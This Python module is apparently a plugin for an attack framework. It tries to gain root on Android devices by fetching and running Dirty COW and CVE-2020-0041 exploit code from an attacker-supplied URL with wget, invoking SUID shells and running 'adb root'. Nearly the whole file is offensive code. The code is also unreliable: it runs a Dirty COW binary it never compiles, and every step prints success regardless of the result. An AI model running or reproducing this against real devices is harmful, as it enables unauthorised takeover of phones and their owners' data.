import os
import subprocess
import pyfiglet
from collections import OrderedDict

MODULE_TYPE = "android"
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Python Android Root Access Bypasser',
            'Rank':'Good',
            'Platform':'Linux/Android',
            'architectures':'x86/64 bit processors',
            'Note':'This script is for educational purposes only',
            'Description': 'Bypass root access on Android using various techniques',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('URL', ('URL (e.g., http://exploit_dirty_cow.com)', False, 'HACKER ADDRESS')),
                ('RHOST', ('', False, 'HACKER IP')),
                ('URL2', ('URL (e.g., http://exploit_cve_2020_0041.com)', False, 'HACKER ADDRESS')),
                ('PORT', ('', False, 'HACKER PORT')),
                
                ])
                }
    def logo(self):
    	title = 'Root priviledge'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set URL <link/to/exploit_dirty_cow.com> | set URL2 <link/to/exploit_cve_2020_0041.com>  ,then run")
   
   
    
    
    def check_root(self):
      """Check if the device is rooted."""
      try:
        result = subprocess.run(["su", "-c", "echo", "root"], capture_output=True, text=True)
        if "root" in result.stdout:
            print("[+] Device is already rooted.")
            return True
        else:
            print("[-] Device is not rooted.")
            return False
      except Exception as e:
        print(f"[-] Error checking root: {e}")
        return False
    def exploit_dirty_cow(self,url):
      """Exploit Dirty COW vulnerability to gain root access."""
      print("[*] Attempting Dirty COW exploit...")
      try:
        # Download and compile Dirty COW exploit
        os.system(f"wget {url}/dirtycow.c")
        # Run the exploit
        os.system("/data/local/tmp/dirtycow")
        print("[+] Dirty COW exploit successful.")
      except Exception as e:
        print(f"[-] Dirty COW exploit failed: {e}")
    def exploit_suid_binaries(self):
      """Exploit SUID binaries to gain root access."""
      print("[*] Searching for exploitable SUID binaries...")
      try:
        # Find SUID binaries
        os.system("find / -perm -4000 -o -perm -2000 2>/dev/null")
        # Example: Exploit a common SUID binary (e.g., /system/bin/sh)
        os.system("/system/bin/sh -p")
        print("[+] SUID binary exploit successful.")
      except Exception as e:
        print(f"[-] SUID binary exploit failed: {e}")

    def exploit_adb(self):
      """Exploit ADB to gain root access."""
      print("[*] Attempting ADB exploit...")
      try:
        # Check if ADB is running
        result = subprocess.run(["adb", "devices"], capture_output=True, text=True)
        if "device" in result.stdout:
            # Restart ADB as root
            os.system("adb root")
            os.system("adb shell")
            print("[+] ADB exploit successful.")
        else:
            print("[-] ADB is not running.")
      except Exception as e:
        print(f"[-] ADB exploit failed: {e}")
    def exploit_cve_2020_0041(self,url2):
      """Exploit CVE-2020-0041 to gain root access."""
      print("[*] Attempting CVE-2020-0041 exploit...")
      try:
        # Download and compile the exploit
        os.system(f"wget {url2}/cve-2020-0041.c")
        os.system("gcc -o /data/local/tmp/cve-2020-0041 /data/local/tmp/cve-2020-0041.c")
        # Run the exploit
        os.system("/data/local/tmp/cve-2020-0041")
        print("[+] CVE-2020-0041 exploit successful.")
      except Exception as e:
        print(f"[-] CVE-2020-0041 exploit failed: {e}")
    def execute(self):
        url = self.info['Options']['URL'][0]
        url2 = self.info['Options']['URL2'][0]
        REMOTE_IP = self.info['Options']['RHOST'][0]# Replace with attacker's IP        
        REMOTE_PORT = self.info['Options']['PORT'][0]     # Replace with attacker's port
        self.logo()
        print("[*] Starting Android root access bypasser...")
        if not self.check_root():
          self.exploit_dirty_cow(url)
          self.exploit_suid_binaries()
          self.exploit_adb()
          self.exploit_cve_2020_0041(url2)
          print("[*] Android root access bypasser completed.")
      
        return "[+] Initializing / Getting things ready ..."
    